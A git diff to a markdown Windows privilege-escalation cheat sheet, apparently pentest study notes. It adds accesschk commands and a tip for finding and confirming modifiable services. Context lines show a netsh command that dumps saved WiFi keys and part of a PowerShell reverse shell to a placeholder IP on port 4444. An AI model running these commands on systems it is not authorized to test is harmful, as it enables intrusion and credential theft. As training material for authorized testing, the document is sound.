@@ -256,8 +256,14 @@ netsh wlan show profile name="<SSID>" key=clear             :: recover saved WiF
 
 ```cmd
 :: List services and check ACLs with accesschk (Sysinternals)
-accesschk.exe /accepteula -uwcqv <username> *
+accesschk.exe /accepteula -uwcqv <username> *      :: what services CAN <username> modify — scans all services at once
 
+accesschk.exe /accepteula -qlc <servicename>        :: full ACL/SDDL dump for ONE specific service — see exactly who has what rights
+```
+
+> 💡 Use `-uwcqv <username> *` first to sweep every service for anything your current user can write to. Once something looks promising, run `-qlc <servicename>` on it to see the raw permission breakdown (which SID has `SERVICE_CHANGE_CONFIG`, `SERVICE_START`, etc.) and confirm it's really exploitable before touching `sc config`.
+
+```cmd
 sc qc <servicename>              :: query service config (binary path, start type, account)
 sc query state= all              :: enumerate all services
 ```
@@ -640,7 +646,7 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('[YOUR_IP]',4444);$s=$c.
 | TryHackMe: Windows Privilege Escalation | https://tryhackme.com/room/windowsprivesc20 |
 | PayloadsAllTheThings: Windows PrivEsc | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md |
 | HackTricks: Windows Local Privilege Escalation | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html |
-| Conda: OSCP Methodology | https://www.youtube.com/watch?v=VpNaPAh93vE |
+| Conda: OSCP Methodology Playlist | https://youtu.be/Qfy-traJwIs?si=xnYrYGvLItH9xnmg |
 
 ---
 
